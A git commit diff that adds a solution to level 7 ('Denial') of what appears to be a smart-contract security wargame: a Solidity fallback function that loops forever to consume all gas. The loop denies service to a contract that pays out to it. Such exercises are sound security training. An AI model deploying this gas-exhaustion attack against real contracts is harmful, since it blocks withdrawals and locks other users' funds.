62fff7916a88242e1fb858ac598683b19a6f2c18
Matt <matt.b.wilder1@gmail.com>
2022-08-01 20:02:03 -0600

    add level 7 solution

--- contracts/7. Denial/AttackingDenial.sol
+++ contracts/7. Denial/AttackingDenial.sol
@@ -10,4 +10,11 @@ contract AttackingDenial {
     }
 
     //Code me!
+    fallback() external payable {
+        // assert instruction consumes all gas
+        // assert(false); did not work
+
+        // caught in while loop
+        while (true) {}
+    }
 }
